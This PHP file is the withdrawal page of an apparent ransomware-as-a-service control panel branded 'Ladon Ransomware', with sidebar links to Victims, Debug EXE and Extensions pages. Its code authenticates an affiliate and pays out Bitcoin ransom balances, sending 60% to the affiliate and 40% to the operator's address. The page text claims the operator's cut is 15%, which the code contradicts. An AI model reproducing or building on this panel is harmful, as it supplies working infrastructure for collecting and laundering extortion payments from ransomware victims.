<?php
include_once("config.php");
$message = "";
if(!empty($_POST['password']) && !empty($_POST['bitcoinaddress']) && !empty($_POST['amount'])){
	$password = $_POST['password'];
	$bitcoinaddress = $_POST['bitcoinaddress'];
	$amount = $_POST['amount'];
	$query = "SELECT * FROM `users` WHERE `username` = :username AND `password` = :password";
	if($bitcoin->getbalance($session) >= $amount && $amount != 0){
	if($sth = $db->prepare($query)){
		$sth->bindParam(":username", $session);
		$sth->bindParam(":password", $password);
		$sth->execute();
		if($sth->rowCount() > 0){
			$bitcoin->sendtoaddress($bitcoinaddress, $amount * 0.6);
			$bitcoin->sendtoaddress($ouraddress, $amount * 0.4);
		}
		else{
			$message = "Possibly Wrong password... Try Again...";
		}
	}
}
else{
	$message = " Amount is too much or your balance is 0!!!";
}
}

?>

<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
        <meta name="description" content="">
        <meta name="keyword" content="">

        <title>Ladon Ransomware</title>
        <!-- Theme Css -->
        <link href="assets/css/bootstrap.min.css" rel="stylesheet">
        <link href="assets/css/slidebars.min.css" rel="stylesheet">
        <link href="assets/css/icons.css" rel="stylesheet">
        <link href="assets/css/menu.css" rel="stylesheet" type="text/css">
        <link href="assets/css/style.css" rel="stylesheet">
    </head>

    <body class="sticky-header">
        <section>
            <!-- sidebar left start-->
            <div class="sidebar-left">
                <div class="sidebar-left-info">
  
                                        
                    <!--sidebar nav start-->
                    <ul class="side-navigation">
                        <li class="active">
                            <a href="index.php"><span>Dashboard</span></a>
                        </li>
                       
                        <li class="active"><a href="data.php"> <span>Victims</span></a>
                        </li>
                        <li class="active"><a href="withdraw.php"> <span>Withdrawl</span></a>
                        </li>

			<li class="active"><a href="debug.php"> <span>Debug EXE</span></a>
                        </li>
                        <li class="active"><a href="extensions.php"> <span>Extensions</span></a>
                        </li>

			<li class="active"><a href="pass.php"> <span>Change Password</span></a>
                        </li>
                        <?php
                         if($session == hash('sha256', "admin"))
                        { ?>
                        <li class="active"><a href="users.php"> <span>Add Users</span></a>
                        </li>
                        <?php
                        }
                            ?>

                        <li class="active"><a href="logout.php"> <span>LogOut</span></a>
                        </li>
                    </ul><!--sidebar nav end-->
                </div>
            </div><!-- sidebar left end-->

            <!-- body content start-->
            <div class="body-content">
                <!-- header section start-->
                <div class="header-section">
                    <!--logo and logo icon start-->
                    <div class="logo">
                        <a href="index.php">
                            <!--<i class="fa fa-maxcdn"></i>-->
                            <span class="brand-name">LADON RANSOMWARE</span>
                        </a>
                    </div>

                    <!--toggle button start-->
                    <a class="toggle-btn"><i class="ti ti-menu"></i></a>
                    <!--toggle button end-->

                  

                </div>
                <!-- header section end-->

                <div class="container-fluid">
                    <div class="page-head">
                        <h4 class="mt-2 mb-2">Withdraw</h4>
                    </div>



  					<div class="row">
                        <div class="col-12">
                            <div class="card m-b-30">
                                <div class="card-body">
                                    <h5 class="header-title pb-3">Withdraw</h5>              
                                    <div class="general-label">
                                        <form class="form-inline" role="form" method="POST">
                                            <div class="form-group">
                                                <label class="sr-only" for="bitcoinaddress">Your Bitcoin Address</label>
                                                <input class="form-control ml-2" id="bitcoinaddress" name="bitcoinaddress" placeholder="Enter YOUR bitcoin address">
                                            </div>
                                              
                                            <div class="form-group m-l-10">
                                                <label class="sr-only" for="password">Password</label>
                                                <input type="password" class="form-control ml-2" id="password" name="password" placeholder="Enter your password here">
                                            </div>
                                            <div class="form-group m-l-10">
                                                <label class="sr-only" for="amount">WithDraw Amount</label>
                                                <input class="form-control ml-2" id="amount" name="amount" placeholder="Enter amount to withdraw">
                                            </div>
                                            <button type="submit" class="btn btn-success ml-2">Withdraw!</button>
                                        </form>       
                                        <?php
                                        if($message != ""){
                                        	echo $message;
                                        }


                                        ?>
                                        <p>15% of your withdrawl amount will automatically go to us as partnership.</p>    
                                    </div>                            
                                </div>
                            </div>
                        </div>
                    </div><!--end row-->

                          
                    
                </div><!--end container-->

                <!--footer section start-->
                <footer class="footer">
                    LANDON RANSOMWARE
                </footer>
                <!--footer section end-->



            </div>
            <!--end body content-->
        </section>

        
        <script src="assets/js/jquery-3.2.1.min.js"></script>
        <script src="assets/js/bootstrap.min.js"></script>
        <script src="assets/js/jquery-migrate.js"></script>
        <script src="assets/js/jquery.slimscroll.min.js"></script>

    </body>
</html>
